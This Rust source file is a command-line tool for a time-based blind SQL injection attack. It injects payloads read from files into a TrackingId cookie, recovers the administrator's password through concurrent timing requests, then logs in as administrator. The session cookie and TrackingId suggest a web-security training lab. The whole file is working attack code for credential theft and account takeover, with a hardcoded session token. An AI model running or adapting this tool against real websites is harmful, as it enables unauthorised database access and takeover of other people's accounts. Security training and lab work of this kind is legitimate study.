use clap::{Parser, Subcommand};
use my_request::*;
use sqli::*;
use std::path::PathBuf;

#[derive(Parser)]
struct Args {
    #[arg(long, short)]
    url: String,

    #[arg(long, short)]
    endpoint: String,

    #[arg(long, short = 'l', value_name = "payload_length")]
    payload_length: PathBuf,

    #[arg(long, short = 'p', value_name = "payload_password")]
    payload_password: PathBuf,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    Proxy,
}

fn format_payload(payload: String) -> String {
    format!(
        "Cookie: TrackingId=a'||({})||'; session=DewyUwfIxPSh1d2KIrrsTlqNDu3RnANX",
        payload
    )
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();
    let args = Args::parse();
    let file_path_lenth = args.payload_length;
    let file_path_password = args.payload_password;
    let endpoint = args.endpoint;
    let url = args.url;
    let proxy = args.command.is_some();
    let redirect = RedirectPolicy::All;

    let concurrency = 10;
    let time = std::time::Duration::from_secs(3);

    let payload = get_file_contents(file_path_lenth).await?;
    let payload_length = format_payload(payload);

    let payload = get_file_contents(file_path_password).await?;
    let payload_password = format_payload(payload);

    //println!("{}", payload);

    let myclient = MyClient::new(url, proxy, redirect);
    println!("Lets look for the Length of the password for the administrator");
    let password = blind_time(
        concurrency,
        &myclient,
        &endpoint,
        Some(&payload_length),
        Some(&payload_password),
        time,
    )
    .await?;
    println!("The password is {}", password);

    println!("Lets authenticate as admin now");
    myclient.login("administrator", &password).await?;
    println!("Success...?");
    myclient.get_request("/", None).await?;
    //myclient.print_request(res, true, true, false).await?;

    Ok(())
}
